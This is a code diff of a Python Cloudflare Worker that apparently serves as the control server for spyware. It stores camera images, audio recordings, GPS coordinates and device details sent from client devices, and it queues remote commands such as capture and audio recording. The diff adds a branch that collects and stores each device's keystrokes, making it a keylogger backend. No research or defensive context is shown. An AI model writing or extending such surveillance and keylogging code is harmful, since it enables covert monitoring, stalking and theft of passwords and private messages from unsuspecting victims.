@@ -30,7 +30,6 @@ class Default(WorkerEntrypoint):
                 data = await request.json()
                 client_id = data.get("id", "unknown_device")
                 
-                # ছবি বা অডিও ডেটা হ্যান্ডল করা
                 if "camera_image" in data or "audio_data" in data:
                     if client_id in clients:
                         if "camera_image" in data:
@@ -39,13 +38,14 @@ class Default(WorkerEntrypoint):
                         if "audio_data" in data:
                             clients[client_id]["audio_data"] = data["audio_data"]
                             clients[client_id]["audio_time"] = data.get("time", "")
-                        
-                        # কমান্ড রিসেট করা
                         clients[client_id]["command"] = None
+                elif "keystrokes" in data:
+                    if client_id not in clients:
+                        clients[client_id] = {}
+                    clients[client_id]["keystrokes"] = data["keystrokes"]
                 else:
                     if client_id not in clients:
                         clients[client_id] = {}
-                    
                     clients[client_id].update({
                         "id": client_id,
                         "lat": data.get("lat"),
@@ -55,7 +55,6 @@ class Default(WorkerEntrypoint):
                         "browser": data.get("browser", "Unknown"),
                         "battery": data.get("battery", "N/A"),
                         "charging": data.get("charging", "N/A"),
-                        "network": data.get("network", "N/A"),
                         "lastSeen": data.get("time", "")
                     })
                 return Response(json.dumps({"status": "success"}), headers={**cors_headers, "Content-Type": "application/json"})
@@ -69,7 +68,7 @@ class Default(WorkerEntrypoint):
             try:
                 data = await request.json()
                 client_id = data.get("client_id")
-                command = data.get("command") # 'capture', 'record_audio'
+                command = data.get("command")
                 if client_id in clients:
                     clients[client_id]["command"] = command
                     return Response(json.dumps({"status": "success"}), headers={**cors_headers, "Content-Type": "application/json"})
